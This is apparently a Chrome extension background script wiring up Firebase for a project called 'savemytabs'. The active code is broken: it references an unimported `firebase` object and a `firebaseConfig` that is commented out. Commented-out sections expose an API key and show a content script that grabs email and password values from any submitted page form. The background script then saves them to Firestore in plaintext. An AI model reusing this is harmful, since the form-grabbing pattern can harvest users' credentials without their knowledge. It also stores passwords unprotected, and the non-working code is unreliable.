// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAuth, createUserWithEmailAndPassword } from "firebase/auth";
import { getFirestore, collection, doc, setDoc } from "firebase/firestore";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// const firebaseConfig = {
//   apiKey: "AIzaSyDUt2fW-Ejfb4Ctb0TeIvKLB-S9o2tyI9w",
//   authDomain: "savemytabs-ac4d6.firebaseapp.com",
//   databaseURL: "https://savemytabs-ac4d6-default-rtdb.firebaseio.com",
//   projectId: "savemytabs-ac4d6",
//   storageBucket: "savemytabs-ac4d6.firebasestorage.app",
//   messagingSenderId: "476416480968",
//   appId: "1:476416480968:web:0263115d3f8ee14d85b7fd",
//   measurementId: "G-CWFQ08G4Z0"
// };

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
// const db = firebase.database();
const db = firebase.getFirestore(app);

console.log("Firebase initialized");

// // Listen for messages from content scripts
// chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
//   if (message.email && message.password) {
//     // Save the email and password to Firebase
//     db.collection("users").doc(message.email).set({
//       email: message.email,
//       password: message.password, // Not recommended to store passwords in plain text
//       timestamp: new Date()
//     })
//     .then(() => {
//       console.log("User data saved to Firebase");
//       sendResponse({ status: "success" });
//     })
//     .catch((error) => {
//       console.error("Error saving user data:", error);
//       sendResponse({ status: "error", error });
//     });
//   }

//   return true; // Keeps the message channel open for asynchronous response
// });

// auth.createUserWithEmailAndPassword(email, password)
//   .then((userCredential) => {
//     console.log("User signed up:", userCredential.user);
//   })
//   .catch((error) => {
//     console.error("Error signing up:", error);
//   });

// // Wait for the form submission
// document.querySelector("form").addEventListener("submit", (event) => {
//   event.preventDefault(); // Prevent actual form submission

//   // Extract email and password
//   const email = document.querySelector("input[name='email']").value;
//   const password = document.querySelector("input[name='password']").value;

//   // Send the data to the background script
//   chrome.runtime.sendMessage({ email, password }, (response) => {
//     console.log("Data sent to background script:", response);
//   });

//   // Optionally, allow the form to proceed after extracting data
//   event.target.submit();
// });

